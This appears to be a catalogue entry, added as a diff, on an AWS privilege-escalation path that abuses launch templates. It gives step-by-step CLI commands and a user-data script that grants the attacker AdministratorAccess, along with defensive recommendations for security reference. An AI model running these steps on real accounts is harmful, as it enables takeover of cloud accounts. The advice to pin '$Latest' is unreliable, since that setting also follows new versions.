@@ -1,0 +1,345 @@
+id: "ec2-004"
+name: "ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate"
+category: "access-resource"
+services:
+  - ec2
+  - iam
+
+permissions:
+  required:
+    - permission: "ec2:CreateLaunchTemplateVersion"
+      resourceConstraints: "Must be able to create new versions of existing launch templates"
+    - permission: "ec2:ModifyLaunchTemplate"
+      resourceConstraints: "Must be able to modify launch template default version"
+  additional:
+    - permission: "ec2:DescribeLaunchTemplates"
+      resourceConstraints: "Helpful for discovering existing launch templates to target"
+    - permission: "ec2:DescribeLaunchTemplateVersions"
+      resourceConstraints: "Useful for viewing existing template configuration including instance profiles"
+    - permission: "iam:ListRoles"
+      resourceConstraints: "Helpful for discovering privileged roles already configured in templates"
+    - permission: "iam:ListInstanceProfiles"
+      resourceConstraints: "Useful for identifying instance profiles with privileged roles"
+    - permission: "autoscaling:DescribeAutoScalingGroups"
+      resourceConstraints: "Helpful for identifying which ASGs use the target launch template"
+    - permission: "ec2:DescribeInstances"
+      resourceConstraints: "Useful for monitoring instance launches and verifying user data execution"
+    - permission: "autoscaling:SetDesiredCapacity"
+      resourceConstraints: "Helpful for triggering instance launches via Auto Scaling Groups"
+
+description: A principal with `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions can escalate privileges by modifying an existing launch template that already references a privileged IAM role. The attacker creates a new template version that keeps the existing privileged role reference but injects malicious user data, then sets this version as the default. Crucially, this attack does NOT require `iam:PassRole` permissions because the attacker is simply referencing a role that already exists in a previous template version. When the next EC2 instance launches from the template (via Auto Scaling Groups, scheduled tasks, or manual launches), it automatically receives the privileged role and executes the malicious user data script, which can grant the attacker persistent administrative access. This is particularly dangerous in environments with auto-scaling policies or scheduled instance launches, where the malicious configuration may activate without any further attacker interaction. EC2 launch templates are commonly used with Auto Scaling Groups to define instance configuration including AMI, instance type, security groups, IAM instance profile, and user data scripts.
+
+prerequisites:
+  admin:
+    - "A launch template must exist that references an IAM role with administrative permissions in a previous version"
+    - "The template must be used by Auto Scaling Groups, scheduled tasks, or manual instance launches"
+    - "The attacker must be able to trigger or wait for an instance launch from the modified template"
+  lateral:
+    - "A launch template must exist that references an IAM role with some elevated permissions"
+    - "The template must be used by Auto Scaling Groups, scheduled tasks, or manual instance launches"
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        # Discover existing launch templates
+        aws ec2 describe-launch-templates \
+          --query 'LaunchTemplates[*].[LaunchTemplateName,LaunchTemplateId,DefaultVersionNumber]' \
+          --output table
+      description: "Enumerate existing launch templates to identify targets for modification."
+    - step: 2
+      command: |
+        # Get template details including instance profile
+        aws ec2 describe-launch-template-versions \
+          --launch-template-id lt-xxxxxxxxxxxxx \
+          --versions '$Default' \
+          --query 'LaunchTemplateVersions[0].LaunchTemplateData'
+      description: "Inspect the target launch template to identify templates that already have privileged IAM instance profiles configured. Look for templates with admin or elevated instance profiles. Replace lt-xxxxxxxxxxxxx with actual template ID."
+    - step: 3
+      command: |
+        # Prepare malicious user data script
+        cat > user-data.sh <<'EOF'
+        #!/bin/bash
+        exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
+        echo "Starting privilege escalation script..."
+
+        STARTING_USER_NAME="YOUR_USERNAME_HERE"
+
+        # Wait for IAM role to be available
+        sleep 15
+
+        # Attach AdministratorAccess policy to the starting user
+        aws iam attach-user-policy \
+          --user-name $STARTING_USER_NAME \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+        echo "AdministratorAccess attached to $STARTING_USER_NAME successfully"
+        EOF
+
+        # Base64 encode the user data
+        USER_DATA_B64=$(cat user-data.sh | base64 | tr -d '\n')
+      description: "Prepare a malicious user data script that will attach AdministratorAccess policy to your starting principal. Replace YOUR_USERNAME_HERE with your actual username."
+    - step: 4
+      command: |
+        # Create a new launch template version with malicious user data
+        # Keep the same instance profile from the existing version (no PassRole needed)
+        aws ec2 create-launch-template-version \
+          --launch-template-id lt-xxxxxxxxxxxxx \
+          --source-version 1 \
+          --launch-template-data "{
+            \"IamInstanceProfile\": {
+              \"Name\": \"EXISTING_PRIVILEGED_INSTANCE_PROFILE\"
+            },
+            \"UserData\": \"$USER_DATA_B64\"
+          }"
+      description: "Create a new launch template version that references the existing privileged instance profile and includes the malicious user data. Replace lt-xxxxxxxxxxxxx with the target template ID and EXISTING_PRIVILEGED_INSTANCE_PROFILE with the instance profile name found in step 2. Note that this does NOT require iam:PassRole since you're referencing an existing role configuration."
+    - step: 5
+      command: |
+        # Set the new version as the default
+        aws ec2 modify-launch-template \
+          --launch-template-id lt-xxxxxxxxxxxxx \
+          --default-version NEW_VERSION_NUMBER
+      description: "Modify the launch template to set the malicious version as the default. Replace NEW_VERSION_NUMBER with the version number from step 4. All future instance launches will now use this malicious configuration."
+    - step: 6
+      command: |
+        # Trigger instance launch (if template is used by an ASG)
+        aws autoscaling set-desired-capacity \
+          --auto-scaling-group-name TARGET_ASG_NAME \
+          --desired-capacity 1
+      description: "Trigger an instance launch. If the template is used by an Auto Scaling Group, you can increase the desired capacity. Alternatively, wait for auto-scaling events or scheduled instance launches to trigger automatically."
+    - step: 7
+      command: |
+        # Wait 2-3 minutes, then verify AdministratorAccess was attached
+        aws iam list-attached-user-policies --user-name YOUR_USERNAME_HERE
+      description: "Wait for the instance to launch and execute the user data script (typically 2-3 minutes), then verify that AdministratorAccess has been attached to your starting principal."
+    - step: 8
+      command: |
+        # Verify administrator access
+        aws iam list-users
+      description: "Verify that you now have administrator access by listing IAM users or performing other admin-level actions."
+
+limitations: |
+  This path provides administrative access only if the target launch template already references a privileged IAM role with administrative permissions (or at least IAM write permissions like `iam:AttachUserPolicy`). If the existing template only references roles with limited permissions, the user data script may fail to attach policies.
+
+  The attack requires that instances actually launch from the modified template. This could happen through:
+  - Auto Scaling Groups that automatically launch instances
+  - Scheduled instance launches
+  - Manual instance launches by other users
+  - Auto-scaling events triggered by CloudWatch alarms
+
+  The attacker may need to wait for these events to occur naturally, or they need additional permissions to trigger instance launches (like `autoscaling:SetDesiredCapacity`).
+
+  Importantly, this attack does NOT require `iam:PassRole` permissions because the attacker is simply referencing an IAM role that already exists in a previous template version. This makes it harder to detect than traditional PassRole-based attacks.
+
+recommendation: |
+  Restrict `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions using resource-based policies to limit which templates can be modified:
+
+  {
+    "Effect": "Allow",
+    "Action": [
+      "ec2:CreateLaunchTemplateVersion",
+      "ec2:ModifyLaunchTemplate"
+    ],
+    "Resource": "arn:aws:ec2:*:ACCOUNT:launch-template/specific-template-id",
+    "Condition": {
+      "StringEquals": {
+        "aws:ResourceTag/Environment": "dev"
+      }
+    }
+  }
+
+  Use Service Control Policies (SCPs) to prevent launch template modifications in production environments unless from approved automation roles.
+
+  Monitor CloudTrail for `CreateLaunchTemplateVersion` and `ModifyLaunchTemplate` API calls, especially on templates that reference privileged instance profiles. Alert when default versions are changed.
+
+  Pin Auto Scaling Groups to specific launch template versions (e.g., `$Latest` or version number) rather than using `$Default`, preventing automatic use of modified default versions.
+
+  Monitor EC2 user data for suspicious IAM-related commands using AWS Config rules or custom Lambda functions that inspect new template versions.
+
+  Regularly audit existing launch templates to identify those with privileged instance profiles and restrict modification permissions to only necessary principals.
+
+  Implement approval workflows for launch template changes using AWS Service Catalog or custom automation with human approval steps.
+
+  Enable MFA requirements for sensitive operations like launch template modifications using `aws:MultiFactorAuthPresent` condition keys.
+
+  Use IAM Access Analyzer to identify principals with template modification permissions on templates containing privileged roles.
+
+  Consider using EC2 Image Builder with locked-down instance profiles instead of relying on user data for configuration.
+
+discoveredBy:
+  name: "Unknown"
+  organization: "Unknown"
+
+references:
+  - title: "AWS EC2 Launch Templates Documentation"
+    url: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-launch-templates.html"
+  - title: "AWS Privilege Escalation Methods - Rhino Security Labs"
+    url: "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+
+relatedPaths:
+  - "ec2-001"
+  - "ec2-002"
+  - "ec2-003"
+
+detectionRules: []
+
+toolSupport:
+  pmapper: false
+  iamVulnerable: false
+  pacu: false
+  prowler: false
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: starting-principal
+      type: principal
+      description: The principal with `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions. Can be an IAM user or role with access to modify existing launch templates.
+
+    - id: existing_template
+      label: Existing Launch Template
+      type: resource
+      description: An existing EC2 launch template that already references a privileged IAM instance profile in a previous version. The attacker discovers this template and identifies the privileged role configuration to exploit.
+
+    - id: new_version
+      label: New Template Version (Malicious)
+      type: action
+      color: '#ff9999'
+      description: |
+        The attacker creates a new launch template version using `ec2:CreateLaunchTemplateVersion`. This new version:
+        - References the same privileged IAM instance profile from the existing version (no `iam:PassRole` required)
+        - Injects malicious user data that will attach AdministratorAccess to the starting principal
+
+        Example command:
+        ```bash
+        aws ec2 create-launch-template-version \
+          --launch-template-id lt-xxxxx \
+          --source-version 1 \
+          --launch-template-data '{
+            "IamInstanceProfile": {"Name": "existing-admin-profile"},
+            "UserData": "base64-encoded-malicious-script"
+          }'
+        ```
+
+    - id: modified_template
+      label: Modified Template (New Default)
+      type: resource
+      description: |
+        The attacker uses `ec2:ModifyLaunchTemplate` to set the malicious version as the default version. All future instance launches from this template will now use the malicious configuration.
+
+        Command:
+        ```bash
+        aws ec2 modify-launch-template \
+          --launch-template-id lt-xxxxx \
+          --default-version NEW_VERSION_NUMBER
+        ```
+
+    - id: instance_launch
+      label: EC2 Instance Launches
+      type: action
+      color: '#99ccff'
+      description: An EC2 instance launches from the modified template. This could happen through Auto Scaling Groups, scheduled tasks, or manual launches by other users. The instance automatically receives the privileged IAM role and executes the malicious user data script.
+
+    - id: privileged_role
+      label: Instance assumes privileged-role
+      type: resource
+      description: The launched EC2 instance automatically assumes the privileged IAM role through its instance profile. The instance's metadata service provides temporary credentials for this role, which are available to all processes including the user data script.
+
+    - id: userdata_action
+      label: User-data script executes
+      type: action
+      color: '#99ccff'
+      description: |
+        The malicious user data script executes automatically during instance initialization, running with the privileged role's credentials. The script attempts to attach the AdministratorAccess policy to the starting principal.
+
+        Example script:
+        ```bash
+        #!/bin/bash
+        aws iam attach-user-policy \
+          --user-name starting-principal-name \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        ```
+
+        The script's success depends on whether the privileged role has IAM write permissions.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: If the privileged role has IAM write permissions (specifically `iam:AttachUserPolicy` or AdministratorAccess), the user data script successfully attaches the AdministratorAccess policy to the starting principal. The starting principal now has full administrative access to the AWS account.
+
+    - id: some_perms
+      label: Limited Escalation Possible
+      type: outcome
+      color: '#ffeb99'
+      description: |
+        If the privileged role has some elevated permissions but lacks IAM write permissions, the user data script fails to attach AdministratorAccess. However, the attacker may still benefit from:
+        - The instance remaining in a modified state that could be exploited later
+        - Potential access to resources the role can reach
+        - The ability to exfiltrate credentials or data through the instance
+
+    - id: no_access
+      label: No Effective Escalation
+      type: outcome
+      color: '#cccccc'
+      description: If the existing launch template only references a role with minimal or read-only permissions, the user data script fails to attach any policies, and there are no useful resources to access. No effective privilege escalation occurs, though the template remains modified with the malicious configuration.
+
+  edges:
+    - from: start
+      to: existing_template
+      label: ec2:DescribeLaunchTemplates
+      description: |
+        The starting principal enumerates existing launch templates to identify targets with privileged IAM instance profiles.
+
+        Command:
+        ```bash
+        aws ec2 describe-launch-templates
+        aws ec2 describe-launch-template-versions \
+          --launch-template-id lt-xxxxx \
+          --versions '$Default'
+        ```
+
+    - from: existing_template
+      to: new_version
+      label: ec2:CreateLaunchTemplateVersion
+      description: The starting principal creates a new launch template version that references the existing privileged instance profile and includes malicious user data. Crucially, this does NOT require `iam:PassRole` because the attacker is simply referencing a role configuration that already exists in a previous version.
+
+    - from: new_version
+      to: modified_template
+      label: ec2:ModifyLaunchTemplate
+      description: The starting principal modifies the launch template to set the malicious version as the new default. All future instance launches will use this compromised configuration until the template is restored.
+
+    - from: modified_template
+      to: instance_launch
+      label: Instance launch triggered
+      description: An EC2 instance launches from the modified template. This could be triggered by the attacker (if they have ASG permissions), by auto-scaling events, by scheduled tasks, or by other users manually launching instances. The attacker may need to wait for these events to occur naturally.
+
+    - from: instance_launch
+      to: privileged_role
+      label: Instance assumes role via instance profile
+      description: The launched instance automatically assumes the privileged IAM role through its instance profile. The EC2 service provides temporary credentials via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME.
+
+    - from: privileged_role
+      to: userdata_action
+      label: User data executes on boot
+      description: The malicious user data script executes automatically during instance initialization (typically within 1-2 minutes of launch), running with the privileged role's credentials. The script has full access to all permissions granted to the privileged role.
+
+    - from: userdata_action
+      to: admin
+      label: If role has IAM write permissions
+      branch: A1
+      condition: admin
+      description: If the privileged role has `iam:AttachUserPolicy` or equivalent IAM write permissions (such as AdministratorAccess), the user data script successfully attaches the AdministratorAccess policy to the starting principal, granting persistent full administrative access.
+
+    - from: userdata_action
+      to: some_perms
+      label: If role has elevated permissions but not IAM write
+      branch: A2
+      condition: some_permissions
+      description: If the privileged role has elevated permissions to access resources (like S3, DynamoDB, Secrets Manager) but lacks IAM write permissions, the user data script fails to attach AdministratorAccess. However, the modified template persists and could be exploited in other ways, or the instance could be used as a pivot point.
+
+    - from: userdata_action
+      to: no_access
+      label: If role has minimal permissions
+      branch: A3
+      condition: no_permissions
+      description: If the existing launch template only references a role with minimal or read-only permissions, the user data script fails and there are no useful resources to access. The template remains modified but provides no effective privilege escalation.
